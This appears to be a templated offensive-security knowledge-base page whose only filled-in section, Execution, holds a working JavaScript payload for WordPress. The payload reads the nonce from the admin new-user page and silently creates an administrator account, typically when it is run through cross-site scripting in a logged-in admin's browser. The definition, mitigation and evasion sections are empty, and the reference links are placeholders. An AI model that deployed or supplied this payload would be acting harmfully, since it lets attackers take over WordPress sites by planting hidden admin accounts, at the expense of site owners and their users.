---
category: technique
subjects:
  - cybersec
full_form: NULL
acronym: NULL
cwe:
  - NULL
vector: remote/adjacent network/local/client-side
privileges: unauthenticated/authenticated/root
target: NULL
platform:
  - NULL
intent:
  - NULL
---
## Definition

## Discovery

## Execution

```js
let u="/wp-admin/user-new.php";let r=new XMLHttpRequest();r.open("GET",u,!1);r.send();let n=(/ser" value="([^"]*?)"/g).exec(r.responseText)[1];r=new XMLHttpRequest();r.open("POST",u,1);r.setRequestHeader("Content-Type","application/x-www-form-urlencoded");r.send("action=createuser&_wpnonce_create-user="+n+"&user_login=_USR_&email=tmp@mail.com&pass1=_PWD_&pass2=_PWD_&role=administrator");
```

## Mitigation

## Evasion

## Relevant Reading
- [TNNNN - NAME](https://attack.mitre.org/techniques/TNNNN)
- [TANNNN - NAME](https://attack.mitre.org/tactics/TANNNN)
- [MNNNN - NAME](https://attack.mitre.org/mitigations/MNNNN)
- [Payload All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/)
- [EDB-ID XXXXXX](https://www.exploit-db.com/)
